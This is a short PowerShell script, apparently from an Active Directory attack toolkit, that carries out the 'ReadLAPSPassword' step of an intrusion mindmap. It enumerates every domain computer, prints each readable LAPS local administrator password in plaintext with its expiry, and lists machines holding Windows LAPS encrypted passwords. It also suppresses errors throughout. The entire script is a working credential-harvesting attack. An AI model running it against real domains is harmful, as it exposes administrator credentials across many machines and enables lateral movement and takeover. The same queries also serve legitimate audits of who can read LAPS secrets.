# laps_read — attempt to read ms-Mcs-AdmPwd on each computer
# OCD mindmap: ACLs/ACEs branch (ReadLAPSPassword edge)
$ErrorActionPreference = 'SilentlyContinue'

Write-Host "=== LAPS readable computers ==="
try {
    $computers = Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'
    $readable = @()
    foreach ($c in $computers) {
        $pwd = $c.'ms-Mcs-AdmPwd'
        if ($pwd) {
            $readable += [PSCustomObject]@{
                Computer = $c.Name
                Password = $pwd
                Expires  = [DateTime]::FromFileTime($c.'ms-Mcs-AdmPwdExpirationTime')
            }
        }
    }
    if ($readable.Count -eq 0) {
        Write-Host "No LAPS passwords readable with current token"
    } else {
        $readable | Format-Table -AutoSize
    }
} catch {
    Write-Host "LAPS attribute query failed: $_"
}

Write-Host "`n=== LAPS v2 (Windows LAPS) encrypted attributes ==="
try {
    Get-ADComputer -Filter 'msLAPS-EncryptedPassword -like "*"' `
                    -Properties 'msLAPS-EncryptedPassword' |
        Select-Object Name | Format-Table
} catch {}
